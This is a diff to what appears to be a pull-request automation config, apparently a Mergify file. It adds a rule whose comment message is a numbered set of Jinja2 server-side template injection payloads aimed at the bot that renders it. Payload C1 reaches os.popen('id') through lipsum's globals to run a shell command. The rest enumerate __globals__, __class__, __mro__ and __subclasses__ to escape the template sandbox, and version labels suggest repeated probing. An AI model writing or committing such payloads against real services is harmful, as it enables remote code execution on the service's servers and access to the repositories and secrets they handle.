@@ -1,2 +1,28 @@
-pull_request_rules: []
-# v23 trigger 17613
+pull_request_rules:
+  - name: v24-attr-chain-on-functions
+    conditions: []
+    actions:
+      comment:
+        message: |
+          === G4o7T v24 attr-chain-on-functions ===
+          C1-lipsum-globals: {{ (lipsum | attr('__globals__'))['__builtins__']['__import__']('os')['popen']('id').read() }}
+          C2-cycler-init-globals: {{ cycler | attr('__init__') | attr('__globals__') }}
+          C3-joiner-init-globals: {{ joiner | attr('__init__') | attr('__globals__') }}
+          C4-namespace-init-globals: {{ namespace | attr('__init__') | attr('__globals__') }}
+          C5-range-init-globals: {{ range | attr('__init__') | attr('__globals__') }}
+          C6-dict-init-globals: {{ dict | attr('__init__') | attr('__globals__') }}
+          C7-lipsum-module: {{ lipsum | attr('__module__') }}
+          C8-lipsum-name: {{ lipsum | attr('__name__') }}
+          C9-lipsum-qualname: {{ lipsum | attr('__qualname__') }}
+          C10-lipsum-dict: {{ lipsum | attr('__dict__') }}
+          C11-lipsum-self: {{ lipsum | attr('__self__') }}
+          C12-lipsum-func: {{ lipsum | attr('__func__') }}
+          C13-lipsum-class: {{ lipsum | attr('__class__') }}
+          C14-lipsum-class-mro: {{ lipsum | attr('__class__') | attr('__mro__') }}
+          C15-lipsum-class-bases: {{ lipsum | attr('__class__') | attr('__bases__') }}
+          C16-lipsum-class-subclasses: {{ lipsum | attr('__class__') | attr('__subclasses__') }}
+          C17-lipsum-globals-direct: {{ lipsum.__globals__ }}
+          C18-cycler-class: {{ cycler | attr('__class__') }}
+          C19-joiner-class: {{ joiner | attr('__class__') }}
+          C20-namespace-class: {{ namespace('a') | attr('__class__') }}
+          === end v24 ===
